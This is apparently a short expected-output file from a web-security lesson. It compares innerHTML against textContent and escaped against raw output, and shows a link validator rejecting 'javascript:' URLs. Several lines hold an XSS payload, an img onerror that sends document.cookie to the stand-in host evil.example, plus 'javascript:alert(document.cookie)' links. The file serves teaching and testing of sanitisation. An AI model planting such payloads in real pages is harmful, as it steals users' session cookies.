@@ -1,0 +1,8 @@
+innerHTML   created: ["<img alt=\"\" onerror=\"fetch('//evil.example?c='+document.cookie)\">"]
+textContent created: 0 elements
+<p>Harika ders! &lt;img alt=&quot;&quot; onerror=&quot;fetch(&#x27;//evil.example?c=&#x27;+document.cookie)&quot;&gt;</p>
+<a href="javascript:alert(document.cookie)">my site</a>
+<p>Harika ders! <img alt="" onerror="fetch('//evil.example?c='+document.cookie)"></p>
+"javascript:alert(document.cookie)" -> (no link)
+"https://ışıl.dev/notlar" -> https://xn--l-ekaa7p.dev/notlar
+" JaVaScRiPt:alert(1)" -> (no link)
